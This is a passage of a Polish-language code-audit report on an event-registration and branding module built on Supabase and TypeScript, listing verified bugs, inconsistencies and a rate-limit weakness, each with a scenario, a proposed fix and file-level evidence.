
**Weryfikacja.** Zapytanie selektuje status: src/lib/events/eventPagesApi.ts:181-185 ('id, slug, title_pl, title_en, status'), a komentarz :170-175 wprost mowi 'Czytamy ja WYLACZNIE dla slugu'. Panel bierze tylko slug (src/components/admin/events/organisms/EventPagesMenuPanel.tsx:124) i uzywa go jedynie w karcie 'advanced' (:297-306) - grep po rootQ/rootPageSlug w tym pliku daje wylacznie linie 122, 124, 297 i 303, wiec statusu […]

### [średni] Przelacznik wygladu jasny/ciemny w Brandingu nie ma zadnego wplywu na strone wydarzenia

`src/lib/events/eventBrandingCss.ts:33` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

EventBrandingPanel rysuje dwie karty appearance z miniaturami (EventBrandingPanel.tsx:83-107), eventBrandingPayload wysyla klucz ZAWSZE (eventBrandingDraft.ts:115), a admin_event_branding_save go przyjmuje i zapisuje (20260826090000:521-529). Generator CSS brandingu wydarzenia klucz jednak swiadomie pomija - komentarz na 25 linii (eventBrandingCss.ts:33-57) opisuje trzy powody (brak stanu dziedzicz, zakres brandingu obejmuje tylko portal wydarzenia, wariant dark Tailwinda patrzy na przodka) i konczy sie zdaniem, ze poprawna odpowiedzia jest 'albo usuniecie kontrolki, albo dodanie jej trzeciego stanu'. Zadna z tych dwoch drog nie zostala wybrana, wiec ekran nadal obiecuje wybor, ktorego nie realizuje - i dodatkowo kazde istniejace wydarzenie ma juz zapisane appearance = light, wiec pozniejsze dociagniecie mechanizmu przemaluje portale wszystkim czytelnikom trybu ciemnego.

**Scenariusz.** Organizator kongresu wybiera Dark, zapisuje (toast brandingSaved) i otwiera strone wydarzenia w przegladarce ustawionej na motyw jasny - portal jest jasny. Zaden komunikat nie mowi, ze wybor dotyczy tylko miniatury na karcie w panelu.

**Naprawa.** Rozstrzygnac zgodnie z wlasnym komentarzem generatora: albo zdjac karty appearance z ekranu i z eventBrandingPayload (do czasu wsparcia), albo dolozyc trzeci stan 'dziedzicz z motywu czytelnika', zmigrowac zapisane light na brak klucza i dopiero wtedy wstrzykiwac klase motywu na opakowaniu portalu.

**Weryfikacja.** Generator CSS jawnie pomija klucz - komentarz src/lib/events/eventBrandingCss.ts:33-57 ('KLUCZ appearance (jasny / ciemny) JEST TU SWIADOMIE NIEOBSLUGIWANY') i konczy sie zdaniem o 'usunieciu kontrolki albo dodaniu trzeciego stanu'; SLOT_VARIABLES (:93-107) nie zawiera appearance, a jedyne wyjscia generatora to zmienne kolorow i tlo. Payload wysyla klucz zawsze (src/lib/events/eventBrandingDraft.ts:113-115: payload […]

### [średni] Zwykla podstrona wydarzenia otwiera sie poza portalem wydarzenia - bez brandingu, menu i drogi powrotu

`src/components/events/public/atoms/EventPageLink.tsx:59` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

Pozycja bez znacznika modulowego prowadzi do trasy splat: <Link to="/$" params={{ _splat: item.path }} /> (:55-66). Trasa src/routes/$.tsx (1418 linii) nie zawiera slowa 'event' w calym pliku - nie zaklada eventBrandingScopeProps (eventBrandingCss.ts:81), nie montuje EventTabsNav ani EventMenuNav i nie wie, ze strona nalezy do wydarzenia. Piec stron modulowych ma wlasne trasy pod /events/$slug/... (EVENT_MODULE_ROUTE, src/lib/events/eventModules.ts) i tego problemu nie ma. Kryterium odbioru E3 mowi 'podstrona wydarzenia powstaje i publikuje sie bez wejscia w /admin/pages' - powstaje i publikuje sie, ale konczy jako zwykla strona serwisu, wiec branding wydarzenia (E3/Branding) na niej nie obowiazuje.

**Scenariusz.** Organizator zaklada podstrone 'Dojazd i noclegi' szablonem, publikuje ja i klika pozycje w menu wydarzenia. Przegladarka pokazuje strone w zwyklej ramie serwisu: bez kolorow wydarzenia, bez paska zakladek wydarzenia i bez odnosnika z powrotem do strony glownej wydarzenia - uczestnik wypada z portalu jednym klikniecim.

**Naprawa.** Rozpoznac w trasie splat strony nalezace do poddrzewa events.root_page_id (jedno zapytanie o event po page_id albo dedykowana trasa /events/$slug/p/$pagePath) i opakowac je ta sama powloka co strony modulowe: eventBrandingScopeProps, EventTabsNav i menu wydarzenia.

**Weryfikacja.** src/components/events/public/atoms/EventPageLink.tsx:53-66 - pozycja z module === null idzie do <Link to="/$" params={{ _splat: item.path }}>. Trasa splat nie zna wydarzenia: grep -ci 'event' na src/routes/$.tsx daje 0 przy 1418 liniach, a grep na eventBrandingScopeProps/EventTabsNav/EventMenuNav w tym pliku nie daje nic - czyli ani atrybutu data-event-branding (src/lib/events/eventBrandingCss.ts:81-82), ani paska […]

### [średni] admin_event_general_save nie waliduje strefy czasowej, choc admin_event_create to robi

`supabase/migrations/20260826170000_event_general_save_match_table_checks.sql:314` · niespojnosc · weryfikacja: POTWIERDZONE

Zapis ustawien przyjmuje strefe jako dowolny niepusty tekst: timezone = CASE WHEN p_payload ? 'timezone' THEN COALESCE(NULLIF(btrim(...), ''), e.timezone) ELSE e.timezone END (:314-316). Tabela events nie ma na tej kolumnie zadnego CHECK-a (20260713093000_events_module.sql:37 - timezone text NOT NULL DEFAULT 'Europe/Warsaw'). Tymczasem admin_event_create sprawdza wprost: IF v_timezone IS NOT NULL AND NOT EXISTS (SELECT 1 FROM pg_timezone_names z WHERE z.name = v_timezone) THEN RAISE EXCEPTION 'invalid_timezone' (20260826181500:505-508), z uzasadnieniem, ze nieznana nazwa rozjedzie liczenie kolizji sesji. To jest dokladnie ta klasa rozjazdu, ktora migracja 20260826170000 mial zamykac (jej naglowek: 'funkcja, ktora waliduje mniej niz tabela, jest gorsza niz brak walidacji'). Droplista UI bierze wartosci z Intl.supportedValuesOf (src/lib/events/timeZoneOptions.ts:33-41), a Intl i pg_timezone_names nie sa tym samym zbiorem; RPC jest ponadto wolane wprost przez kazdego admina.

**Scenariusz.** Wydarzenie zalozone ze strefa Europe/Kyiv przechodzi kontrole przy tworzeniu. Po zapisie z panelu w przegladarce, ktorej ICU oferuje alias nieznany serwerowi (albo po wywolaniu RPC z dowolna wartoscia), events.timezone przestaje byc nazwa IANA znana Postgresowi: eventTimeZone (timezone.ts:86-91) po cichu degraduje do Europe/Warsaw, wiec uczestnik widzi godziny warszawskie opisane jako warszawskie, a liczenie kolizji […]

**Naprawa.** Dodac w admin_event_general_save ten sam warunek co w admin_event_create (EXISTS w pg_timezone_names, wyjatek invalid_timezone), a docelowo zamknac zbior CHECK-iem albo kolumna typu wyliczeniowego, zeby regula nie zalezala od tego, ktoredy dane weszly.

**Weryfikacja.** Zapis przyjmuje dowolny niepusty tekst: supabase/migrations/20260826170000_event_general_save_match_table_checks.sql:314-316; grep 'pg_timezone' po calym pliku daje tylko te trzy linie kolumny timezone, czyli zadnej walidacji. To jest ostatnia definicja funkcji (grep -l admin_event_general_save po migracjach: 20260826090000, 20260826114319, 20260826114933, 20260826150000, 20260826170000 - 170000 jest najpozniejsza), […]

### [niski] Trzy rozne wzorce adresu obrazu tla - adres z nawiasem zapisuje sie bez bledu i nigdy sie nie renderuje

`src/lib/events/eventBrandingDraft.ts:104` · niespojnosc · weryfikacja: POTWIERDZONE

Ta sama wartosc przechodzi przez trzy rozne regexy: formularz dopuszcza /^https:\/\/\S+$/ (eventBrandingDraft.ts:104), RPC dopuszcza '^https://[^[:space:]]+$' przy limicie 2048 znakow (20260826090000:547), a generator CSS renderuje TYLKO adresy pasujace do SAFE_IMAGE_URL = /^https:\/\/[^\s"'()\\]+$/ (eventBrandingCss.ts:113, uzyte w :175). Trzeci wzorzec jest najwezszy, bo wartosc wchodzi do url("..."), i to jest sluszne - ale dwa poprzedzajace go go nie znaja, wiec odrzucenie nastepuje po cichu, na etapie renderu, bez komunikatu i bez wpisu w interfejsie.

**Scenariusz.** Redaktor wkleja adres z CDN zawierajacy nawias, np. https://cdn.example.com/tlo(2026).jpg. Formularz go przyjmuje, RPC zapisuje, panel pokazuje toast brandingSaved - a tlo nie pojawia sie ani w podgladzie, ani na stronie. Redaktor nie ma z czego wywnioskowac, ze problem jest w adresie.

**Naprawa.** Podniesc SAFE_IMAGE_URL do rangi jedynego zrodla wzorca: uzyc go w validateEventBranding i przepisac ten sam alfabet do warunku w admin_event_branding_save (odmowa invalid_image dla znakow wychodzacych z deklaracji CSS), zeby odrzucenie stalo przy polu, ktore je wywolalo.

**Weryfikacja.** Wszystkie trzy wzorce sprawdzone dokladnie tam, gdzie wskazano: formularz /^https:\/\/\S+$/ w src/lib/events/eventBrandingDraft.ts:104, RPC '^https://[^[:space:]]+$' przy limicie 2048 w supabase/migrations/20260826090000_event_studio_general.sql:547-549 (i identycznie w pozniejszej 20260826114319), render SAFE_IMAGE_URL = /^https:\/\/[^\s"'()\\]+$/ w src/lib/events/eventBrandingCss.ts:113, uzyty jako jedyny warunek […]

### [niski] Zmiana slugu wydarzenia nie zmienia adresu strony-korzenia ani podstron

`src/components/admin/events/organisms/EventGeneralPanel.tsx:182` · niespojnosc · weryfikacja: POTWIERDZONE

Pole Adres publiczny zmienia events.slug (:178-184, zapis w 20260826170000:311). Slug strony-korzenia jest jednak wyliczany RAZ, w chwili zasiewu, z ówczesnego slugu wydarzenia: public._event_unique_page_slug(_tenant, v_event.slug) (20260826181500:338), a slugi stron modulowych z pary slug wydarzenia + tytul (:366-368). Zaden RPC nie przepisuje ich po zmianie. Po zmianie slugu portal wydarzenia stoi pod /events/<nowy-slug>, a jego podstrony pod /<stary-slug>/<stary-slug>-agenda. Doc odnotowuje pokrewny brak (brak przekierowania ze starego slugu, ZRZUTY.md:3388), ale nie ten rozjazd dwoch przestrzeni adresow.

**Scenariusz.** Wydarzenie 'forum-energetyczne' zostaje przemianowane na 'szczyt-energetyczny-2027'. Strona glowna dziala pod nowym adresem, ale wszystkie podstrony i kafle menu nadal prowadza pod /forum-energetyczne/..., wiec adres podstrony jest sprzeczny z nazwa wydarzenia i z adresem, ktory redaktor wlasnie ustawil.

**Naprawa.** Przy zmianie slugu w admin_event_general_save przeliczac slug korzenia (i opcjonalnie prefiksy stron modulowych) przez _event_unique_page_slug oraz zapisywac przekierowanie ze starego adresu - albo swiadomie oddzielic obie przestrzenie, dokladajac do panelu zdanie mowiace, ze adres podstron nie zmienia sie razem ze slugiem.

**Weryfikacja.** Zapis slugu wydarzenia dotyka wylacznie events.slug: supabase/migrations/20260826170000_event_general_save_match_table_checks.sql:74-87 (walidacja i kolizja) oraz :311 (slug = v_slug); grep 'slug' po calym pliku nie pokazuje ani jednego UPDATE-u public.pages. Slugi stron powstaja raz, w chwili zasiewu, z owczesnego slugu wydarzenia: 20260826181500:338 (public._event_unique_page_slug(_tenant, v_event.slug)) i […]

### [niski] admin_event_branding_save nadpisuje caly obiekt branding - klucze logo i logo_dark gina przy kazdym zapisie z panelu

`supabase/migrations/20260826090000_event_studio_general.sql:556` · blad · weryfikacja: POTWIERDZONE

Funkcja buduje v_out wylacznie z kluczy OBECNYCH w wejsciu (:521-553) i zapisuje go w calosci: UPDATE public.events e SET branding = v_out (:555-557). Biala lista obrazow obejmuje trzy klucze - v_image_keys := ARRAY['background_image','logo','logo_dark'] (:511) - ale panel nie ma zadnego pola logotypu, eventBrandingPayload wysyla tylko appearance, kolory i background_image (eventBrandingDraft.ts:114-123), a eventBrandingFromJson w ogole nie czyta logo/logo_dark (:70-88). Kazdy zapis z ekranu Branding jest wiec pelnym nadpisaniem, ktore kasuje logotypy ustawione dowolna inna droga (import, service_role, przyszly ekran). To jednoczesnie luka wzgledem par. 8 specyfikacji, gdzie zakres Brandingu to 'kolory, logotypy, fonty wydarzenia'.

**Scenariusz.** Logotyp wydarzenia trafia do events.branding.logo importem albo skryptem serwisowym. Redaktor wchodzi na Branding wylacznie po to, zeby poprawic kolor nawigacji, klika Zapisz - RPC dostaje payload bez klucza logo, buduje v_out bez niego i nadpisuje kolumne. Logotyp znika bez sladu i bez komunikatu.

**Naprawa.** Albo scalac wejscie z dotychczasowa wartoscia dla kluczy nieobecnych (zamiast SET branding = v_out uzyc merge z zachowaniem kluczy spoza payloadu, przy zachowanym 'Przywroc branding spolecznosci' jako jawnym czyszczeniu), albo dodac do panelu pola logo i logo_dark, zeby ekran zapisywal komplet bialej listy.

**Weryfikacja.** Mechanizm potwierdzony, ale w innym pliku niz cytowany: obowiazuje pozniejsza definicja supabase/migrations/20260826114319_e981f858-db1a-48e4-880b-5f8ceece179c.sql:475-477 (UPDATE ... SET branding = v_out), identyczna z cytowana 20260826090000:555-557; v_out jest budowany wylacznie z kluczy obecnych w wejsciu (090000:519-553, biala lista obrazow ARRAY['background_image','logo','logo_dark'] w :511). Panel faktycznie […]

---

## Rejestracja

> Podsystem rejestracji jest zbudowany wokół jednej publicznej pary RPC (`event_registration_form` + `event_register`, obie SECURITY DEFINER, tenant wyłącznie z `public_tenant_id()`) oraz warstwy administracyjnej za `assert_editor_tenant()` (`admin_event_registrations_list/counts/decide`, `admin_event_registration_field_upsert/delete`, `admin_event_waitlist_promote`). Warstwa SQL jest dojrzała: jawne tablice przejść, blokady FOR UPDATE, hasze tokenów, RLS bez polityk INSERT dla anona, eksport CSV z neutralizacją formuł (`lib/crm/csv.ts:56-62`) - tu nie znalazłem dziur. Rozjazd jest na granicy UI↔RPC: baza w ostatniej migracji (20260827220945) dołożyła listę `consents` i wymóg kodu dostępu do biletu, a front tych dwóch rzeczy nie zna - w efekcie pole zgody i bilet z kodem trwale blokują zgłoszenie. Drugi problem jest architektoniczny: przebieg „RSVP" z §0.4 nadal jedzie starą ścieżką `rsvp_event()`/`event_rsvps`, więc E5 obsługuje realnie tylko przebieg formularzowy, a jeden `events.capacity` jest liczony niezależnie w dwóch pulach. Stan: przebieg formularz+akceptacja działa […]

### [KRYTYCZNY] Pole zgody (`field_type='consent'`) trwale blokuje zapis - front nie zna listy `consents`

`src/lib/events/registrationFormSurface.ts:138` · blad · weryfikacja: POTWIERDZONE

Migracja 20260827220945 rozdzieliła formularz na `fields` (wszystko poza `consent`) i nową listę `consents` (linie 73-92) oraz dołożyła w `event_register` twardy warunek `missing_required_consents` dla pól `field_type = 'consent' AND is_required` (linie 396-403). Front tej zmiany nie przyjął: interfejs `RegistrationForm` (registrationFormSurface.ts:138-146) nie ma pola `consents`, `parseRegistrationForm` (:304-370) czyta tylko `fields`, `tickets` i `terms`, a `PublicRegistrationForm` renderuje wyłącznie `form.fields` (:290-298) plus trzy zgody wbudowane na sztywno. `draftAnswers` iteruje po `form.fields`, więc klucz zgody nigdy nie trafia do `answers`.

**Scenariusz.** Redaktor dodaje w studiu pole typu `consent` z zaznaczonym „wymagane" (RegistrationFieldDialog.tsx:131-188 pozwala na to bez ostrzeżenia). Wydarzenie ma `registration_mode='form'`. Każdy uczestnik wypełnia formularz, klika „Zapisz się" i dostaje `missing_required_consents: <klucz>`, przetłumaczone na generyczne „Nie udało się zapisać. Spróbuj ponownie." - na ekranie nie ma żadnego pola, które mógłby zaznaczyć. […]

**Naprawa.** Dodać `consents: RegistrationFormConsent[]` do `RegistrationForm` i sparsować klucz `consents` w `parseRegistrationForm` (etykiety PL/EN, `help_*`, `consent_url_pl/en`, `is_required`), wyrenderować je w sekcji zgód `PublicRegistrationForm` jako checkboxy z linkiem do dokumentu, dopisać je do `validateRegistrationDraft` i wysyłać w `answers` jako wartość logiczną `true`. Do czasu poprawki - zablokować typ `consent` w […]

**Weryfikacja.** Sprawdzone i domkniete, a stan jest nawet gorszy niz w opisie. Najnowsza definicja formularza to NIE 20260827220945, tylko supabase/migrations/20260828051054_a4d602e0-23d0-4f88-9d08-29fb80d9a324.sql:443-593 - i ona nadal odsiewa `AND f.field_type <> 'consent'` (linia 511), ale klucza `consents` juz w ogole nie zwraca (RETURN jsonb_build_object ... 'fields', 'tickets', 'terms' - linie 578-583). Jednoczesnie […]

### [wysoki] Bilet z kodem dostępu jest nie do wybrania - UI nie ma pola na kod, a payload go nie wysyła

`src/components/events/registration/RegistrationTicketPicker.tsx:153` · blad · weryfikacja: POTWIERDZONE

`event_register` od migracji 20260827220945:358-362 odrzuca zgłoszenie, gdy `event_ticket_types.access_code_hash IS NOT NULL`, a `p_payload->>'access_code'` jest puste lub nie zgadza się z haszem. Formularz zapisu w ogóle nie zna tego pola: `RegisterInput` (publicRegistrationApi.ts:56-71) nie ma `accessCode`, `submitRegistration` (:130-146) nie dokłada klucza `access_code`, `RegistrationDraft` (registrationSubmitDraft.ts:27-42) też go nie ma. UI wyłącznie WYŚWIETLA podpowiedź, że kod jest wymagany, a `isTicketSelectable` (registrationFormSurface.ts:377-379) nadal pozwala taki bilet zaznaczyć i wysłać.

**Scenariusz.** Organizator zakłada bilet prasowy z kodem dostępu (`access_code` w `admin_event_ticket_upsert`). Dziennikarz wchodzi na /events/<slug>/register, zaznacza ten bilet, wypełnia formularz i dostaje `invalid_access_code` - bez klucza i18n, więc komunikat brzmi „Nie udało się zapisać. Spróbuj ponownie.". Bilet z kodem jest funkcją niedostępną, mimo pełnego wsparcia w bazie i panelu.

**Naprawa.** Dodać `accessCode` do `RegistrationDraft`, pole tekstowe pokazywane pod wybranym biletem, gdy `ticket.requiresAccessCode` (z `accessCodeHint` jako podpowiedzią), przekazać je jako `access_code` w `submitRegistration` i dopisać walidację „kod wymagany" w `validateRegistrationDraft` oraz klucz `invalidAccessCode` w i18n.

**Weryfikacja.** event_register czyta `v_access_code := upper(btrim(COALESCE(p_payload->>'access_code','')))` (20260827220945:209) i odrzuca `invalid_access_code`, gdy `access_code_hash IS NOT NULL` a kod pusty/niezgodny (:358-362). Payload z frontu nie ma tego klucza: submitRegistration buduje go w src/lib/events/publicRegistrationApi.ts:123-146 (event_slug, first/last/email, answers, accepted_term_ids, 3x consent_*, opcjonalnie […]

### [wysoki] Dwie niezależne pule miejsc na jedno `events.capacity` (event_rsvps vs event_registrations)

`src/lib/events/registrationSurface.ts:452` · niespojnosc · weryfikacja: POTWIERDZONE

Przebieg RSVP z §0.4 nie jest realizowany przez E5: dla `registration_mode='rsvp'` i `flow='instant'` powierzchnia oddaje kontrolkę `action: "rsvp"` (registrationSurface.ts:446-455), a trasa woła `rsvp_event()` (src/routes/events.$slug.index.tsx:204-208), które liczy limit z `event_rsvps` (`SELECT count(*) FROM event_rsvps WHERE status='going'`, 20260824082005:246-252). Ścieżka E5 `event_register` liczy ten sam `events.capacity` z `event_registrations` (`_event_seats_left`, 20260823150000:1476-1481, wywołane w 20260827220945:504). Obie tabele nie widzą siebie nawzajem, a `already_registered` sprawdza wyłącznie `event_registrations` (20260827220945:~470).

**Scenariusz.** Wydarzenie `capacity = 100`, tryb `rsvp`. 100 osób zapisuje się przyciskiem na stronie wydarzenia (100 wierszy w `event_rsvps`). Ktoś otwiera bezpośrednio /events/<slug>/register (trasa działa dla trybu rsvp) - `_event_seats_left` widzi 0 wierszy w `event_registrations`, więc zwraca 100 wolnych miejsc i przyjmuje kolejne 100 osób jako `approved`. Sala na 100 osób ma 200 potwierdzonych uczestników, a panel […]

**Naprawa.** Docelowo zamknąć przebieg RSVP w E5: `action: "rsvp"` powinien wołać `event_register` z `registration_mode='rsvp'` (jeden wiersz w `event_registrations`), a `rsvp_event()` zostać wyłącznie migracją danych. Doraźnie - `_event_seats_left` musi liczyć sumę `event_registrations` i `event_rsvps`, a `rsvp_event()` sprawdzać obie tabele; do tego zablokować trasę /register dla `registration_mode='rsvp' AND […]

**Weryfikacja.** Najnowsze `rsvp_event` (supabase/migrations/20260824082005_...sql:244-253) liczy komplet z `SELECT count(*) FROM public.event_rsvps WHERE event_id = p_event_id AND status = 'going'` i porownuje z `v_event.capacity`. Najnowsze `_event_seats_left` (supabase/migrations/20260823150000_event_people_registration.sql:1467-1482) liczy to samo `events.capacity` przeciw `event_registrations` ze statusami […]

### [wysoki] Hurtowa promocja z rezerwy dla konkretnego biletu nie blokuje wiersza wydarzenia - wyścig o limit wydarzenia

`supabase/migrations/20260824090921_2cfd2f33-490b-4360-80b5-1ef03d4dd68b.sql:355` · blad · weryfikacja: POTWIERDZONE

Gałąź hurtowa `admin_event_waitlist_promote` (bez `registration_id`) sprawdza tylko istnienie wydarzenia (linie 349-353) i od razu woła `_event_waitlist_promote(v_tenant, v_event_id, v_ticket_id, v_count)` bez `FOR UPDATE` na wierszu `events`. Sama `_event_waitlist_promote` (20260824085828:618-626) bierze blokadę ALBO na bilecie, ALBO na wydarzeniu - gdy podano bilet, wiersz wydarzenia zostaje niezablokowany, mimo że `_event_seats_left` liczy z niego `events.capacity` (20260823150000:1476-1481). Gałąź pojedyncza tego samego RPC robi to poprawnie (blokuje wydarzenie w linii 297-300, potem bilet), tak samo `event_register` i `event_registration_cancel` - czyli wzorzec istnieje i tylko ta jedna ścieżka go łamie. Komentarz przy `_event_waitlist_promote` twierdzi, że „obie ścieżki stają w tej samej kolejce", co nie jest prawdą.

**Scenariusz.** Wydarzenie `capacity = 100` z dwoma biletami (A i B), 99 zatwierdzonych. Organizator ma w filtrze wybrany bilet A i klika „Promuj" (RegistrationsListPanel.tsx:182-190 przekazuje `ticketTypeId` z filtra). W tej samej chwili uczestnik zapisuje się na bilet B. Promocja trzyma blokadę tylko na wierszu biletu A, zapis - na wierszu wydarzenia i biletu B; blokady są rozłączne, więc obie transakcje odczytują `seats_left = […]

**Naprawa.** W gałęzi hurtowej `admin_event_waitlist_promote` dodać `PERFORM 1 FROM public.events e WHERE e.id = v_event_id AND e.tenant_id = v_tenant FOR UPDATE;` przed wywołaniem `_event_waitlist_promote` - albo (lepiej) przenieść blokadę wiersza wydarzenia do samej `_event_waitlist_promote`, tak by zawsze brała wydarzenie, a bilet dodatkowo, w tej samej kolejności co `event_register`.

**Weryfikacja.** Galaz hurtowa admin_event_waitlist_promote sprawdza tylko EXISTS na wydarzeniu, bez FOR UPDATE, i od razu deleguje: supabase/migrations/20260824090921_...sql:345-356 (`IF NOT EXISTS (SELECT 1 FROM public.events e WHERE e.id = v_event_id ...)` -> `RETURN public._event_waitlist_promote(v_tenant, v_event_id, v_ticket_id, v_count)`). Sama _event_waitlist_promote (supabase/migrations/20260824085828_...sql:618-626) bierze […]

### [wysoki] Lista rezerwowa nieosiągalna z formularza dla wydarzenia bez biletów - `sold_out` zamyka formularz

`supabase/migrations/20260827220945_d4ece1f0-ffc7-43aa-a5b0-a04c95760ae7.sql:50` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

`event_registration_form` ustawia `closed_reason='sold_out'` (a więc `is_open=false`), gdy wydarzenie nie ma aktywnych biletów i `seats_left <= 0`. `PublicRegistrationForm` na `!form.isOpen` renderuje wyłącznie `ClosedNotice` bez żadnej kontrolki (PublicRegistrationForm.tsx:199-208). Tymczasem `event_register` na tym samym wydarzeniu nie odmawia - degraduje status do `waitlist` i nadaje pozycję w kolejce (20260827220945:503-513), bo brak biletu oznacza brak flagi `waitlist_enabled=false`. Kolejka rezerwowa istnieje w bazie i w panelu (promocja, powiadomienia, licznik `awaiting_notice`), ale nie ma jak do niej wejść przez formularz. Dla ścieżki RSVP powierzchnia oferuje przycisk „Dopisz się na listę rezerwową" (registrationSurface.ts:~440), co pogłębia rozjazd między dwoma przebiegami.

**Scenariusz.** Okrągły stół na 40 osób, `registration_mode='form'`, bez biletów. Po 40. zgłoszeniu 41. uczestnik wchodzi na /events/<slug>/register i widzi „Brak wolnych miejsc" bez żadnej akcji. Organizator nie zbiera kolejki, więc po pierwszej rezygnacji `_event_waitlist_promote` nie ma kogo awansować, a zwolnione miejsce przepada.

**Naprawa.** Nie zamykać formularza z powodu `sold_out`, gdy kolejka jest dopuszczalna: oddawać `is_open=true` plus osobną flagę `waitlist_only` (analogicznie do `waitlist_enabled` biletu) i wyrenderować formularz z komunikatem „zapisujesz się na listę rezerwową". Ewentualnie dołożyć na poziomie wydarzenia odpowiednik `waitlist_enabled` i rozstrzygać `sold_out` tylko wtedy, gdy kolejka jest wyłączona.

**Weryfikacja.** W najnowszej definicji formularza (supabase/migrations/20260828051054_...sql:479-493) warunek `WHEN v_active_tickets = 0 AND v_seats_left IS NOT NULL AND v_seats_left <= 0 THEN 'sold_out'` (:491) daje `is_open = false` (:576-577). PublicRegistrationForm na `!form.isOpen` renderuje sam ClosedNotice, bez zadnej kontrolki (src/components/events/registration/PublicRegistrationForm.tsx:199-209). event_register na tym […]

### [wysoki] Walidacja pól wymaganych po stronie serwera działa tylko dla `registration_mode='form'`

`supabase/migrations/20260827220945_d4ece1f0-ffc7-43aa-a5b0-a04c95760ae7.sql:375` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

Cały blok sprawdzania `missing_required_fields` i `missing_required_consents` stoi pod `IF v_event.registration_mode = 'form' THEN` (linie 375-403). Tymczasem `event_registration_form` oddaje `fields` BEZ filtra po trybie (linie 55-71), a `resolveRegistrationSurface` kieruje na trasę formularza także wydarzenia z `registration_mode='rsvp'` i `registration_flow='approval'` (src/lib/events/registrationSurface.ts:401-408). W tej konfiguracji uczestnik widzi pytania organizatora i klientową walidację `validateRegistrationDraft` (registrationSubmitDraft.ts:120-125), a serwer nie sprawdza ich wcale - `event_register` zapisze wiersz z `registration_mode='rsvp'` i pustym `answers`.

**Scenariusz.** Wydarzenie: `registration_mode='rsvp'`, `registration_flow='approval'`, pole wymagane `sector` będące jednocześnie regułą kwalifikującą `in ['gov'] -> auto_approve`. Uczestnik (lub bot) woła `event_register` bezpośrednio z `answers: {}` - pomija wszystkie pytania kwalifikujące, przechodzi walidację i ląduje jako `pending`. Organizator dostaje zgłoszenia bez odpowiedzi, na których miał oprzeć decyzję, a reguła […]

**Naprawa.** Usunąć warunek trybu z bloku walidacji albo zawęzić go do rzeczywistego kryterium: „sprawdzaj pola wymagane zawsze, gdy wydarzenie ma aktywne pola formularza". Alternatywnie `event_registration_form` powinien dla `registration_mode='rsvp'` zwracać pustą listę `fields`, żeby UI i serwer mówiły to samo.

**Weryfikacja.** Caly blok walidacji stoi pod jednym IF: supabase/migrations/20260827220945_...sql:375 `IF v_event.registration_mode = 'form' THEN`, zamkniety na :404 END IF - obejmuje `missing_required_fields` (:376-388) i `missing_required_consents` (:391-403). Poza nim zostaja tylko zgody dokumentowe `terms_required` (:406-417), niezalezne od trybu. Rownoczesnie event_register jawnie dopuszcza tryb rsvp (blokuje wylacznie 'none' […]

### [średni] Bramka częstotliwości opiera się na polu z ciała żądania, a dowód zgody nie ma IP ani user-agenta

`src/lib/events/publicRegistrationApi.ts:131` · bezpieczenstwo · weryfikacja: POTWIERDZONE

`event_register` liczy limit na kluczu `tenant || ':' || COALESCE(v_ip_hash, v_email)`, gdzie `v_ip_hash` pochodzi z `p_payload->>'ip_hash'` (20260827220945:209, 259-266) - czyli z danych wysłanych przez klienta. `submitRegistration` (publicRegistrationApi.ts:131-146) nie wysyła ani `ip_hash`, ani `user_agent` - wywołanie idzie prosto z przeglądarki do PostgREST, bez warstwy serwerowej, która mogłaby je policzyć (rg 'ip_hash' w src/ potwierdza: tylko `auth/bruteforce.functions.ts` używa tego wzorca). Skutki są dwa: (a) limit sprowadza się do 12 prób na adres e-mail, więc skrypt zmieniający adres nie jest ograniczony niczym, a napastnik znający kontrakt może dowolnie rozproszyć klucz podając własny `ip_hash`; (b) `event_term_acceptances.ip_hash` i `user_agent` (20260827220945:540-547) są zawsze NULL, mimo że tabela została zaprojektowana jako dowód udzielenia zgody z wersją dokumentu.

**Scenariusz.** Skrypt woła `event_register` w pętli z adresami `bot+1@x.pl`, `bot+2@x.pl`, ... i losowym `ip_hash` w payloadzie. Każde wywołanie ma własny klucz w `rate_limit_hit`, więc żadne nie zostaje odrzucone; powstaje kilka tysięcy wierszy `event_people` i `event_registrations`, kilka tysięcy maili potwierdzających z kolejki transakcyjnej, a limit miejsc zostaje wyczerpany. Równolegle, przy sporze o zgodę marketingową, w […]

**Naprawa.** Przenieść wywołanie `event_register` za funkcję serwerową (jak `confirmEventRegistrationEmail`), która liczy `ip_hash` z nagłówka żądania i podaje `user_agent`, a w SQL-u przestać ufać `p_payload->>'ip_hash'` (czytać go tylko z `service_role`/kontekstu serwerowego). Do czasu przeniesienia - dołożyć drugi, niezależny klucz limitu (np. per wydarzenie) i captcha/turnstile na formularzu.

**Weryfikacja.** `v_ip_hash text := NULLIF(btrim(COALESCE(p_payload->>'ip_hash','')),'')` i `v_user_agent ... p_payload->>'user_agent'` - supabase/migrations/20260827220945_...sql:209-210, czyli oba pochodza z ciala zadania. Klucz limitu: `rate_limit_hit('event_register', v_tenant::text || ':' || COALESCE(v_ip_hash, v_email), 12, 10)` (:259-266). Te same zmienne ida do dowodu zgody: INSERT INTO event_term_acceptances (... ip_hash, […]

### [średni] Nowe odmowy `event_register` nie mają kluczy i18n - uczestnik dostaje komunikat „spróbuj ponownie"

`src/lib/i18n-event-registration.ts:104` · i18n · weryfikacja: POTWIERDZONE

`registrationFailure` mapuje głowę komunikatu plpgsql na klucz `eventRegistration.errors.<camelCase>` i przy braku klucza degraduje do `unknown` (publicRegistrationErrors.ts:57-67). Słownik (linie 104-131 PL, 225-252 EN) nie zawiera `invalidAccessCode`, `missingRequiredConsents` ani `soldOut` - a wszystkie trzy odmowy dorzuciła migracja 20260827220945 (linie 361, 402, 507). Dla `missingRequiredFields` i `termsRequired` istnieje nawet liczenie brakujących pozycji (`paramsOf`, publicRegistrationErrors.ts:42-53), więc wzorzec jest gotowy i po prostu nie został rozszerzony.

**Scenariusz.** Uczestnik wybiera bilet z kodem dostępu i zostaje odrzucony przez `invalid_access_code`. Zamiast „Ten bilet wymaga kodu z zaproszenia" widzi „Nie udało się zapisać. Spróbuj ponownie." i klika przycisk jeszcze pięć razy, aż wpadnie w `rate_limited` (12 prób / 10 minut). Ten sam efekt przy wyprzedanym bilecie z wyłączoną kolejką (`sold_out`).

